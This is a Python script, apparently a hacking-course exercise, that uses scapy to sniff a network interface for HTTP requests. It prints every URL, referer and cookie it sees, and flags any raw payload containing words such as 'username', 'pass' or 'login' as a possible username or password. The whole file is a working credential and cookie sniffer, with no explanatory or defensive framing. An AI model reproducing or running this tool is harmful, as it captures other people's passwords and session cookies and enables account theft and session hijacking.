import scapy.all as scapy
import argparse
from scapy.layers import http

def sniff(interface):
	scapy.sniff(iface=interface, store=False, prn=processing_sniffed_packets)

def get_url(packet):
	return packet[http.HTTPRequest].Host + packet[http.HTTPRequest].Path

def get_referer(packet):
	return packet[http.HTTPRequest].Referer

def get_cookies(packet):
	return packet[http.HTTPRequest].Cookie

def get_creds(packet):
	if packet.haslayer(scapy.Raw):
		load = packet[scapy.Raw].load
		keywords = ["username","email","uname","pass","password","login"]
		for keyword in keywords:
			if keyword in str(load):
				return load

def processing_sniffed_packets(packet):
	if packet.haslayer(http.HTTPRequest):
		#print(packet.show())

		url = get_url(packet)
		referer = get_referer(packet)
		cookie = get_cookies(packet)

		print(f"[+] Url: {url}\n")
		print(f"[+] Referer: {referer}\n")
		print(f"[+] Cookies: {cookie}")

		creds = get_creds(packet)
		if creds:	
			print(f"\n[+] Possible Username/Password: {creds}\n")

def parsing_args():
	parser = argparse.ArgumentParser()
	parser.add_argument("-i", "--interface", dest="interface", help="Network Interface")

	options = parser.parse_args()

	if not options.interface:
		parser.error("\n[-] Please specify an interface. Use --help for more info.")

	return options

options = parsing_args()

try:
	sniff(options.interface)

except KeyboardInterrupt:
    print("\n[-] Detected CTRL + C .. Quitting\n")

except PermissionError:
    print("\n[-] Operation not permitted, Run the script as superuser ..\n")

except TypeError:
	print("\n[-] a bytes-like object is required, not 'str' ..\n")

except OSError:
	print("\n[-] No such interface ..")

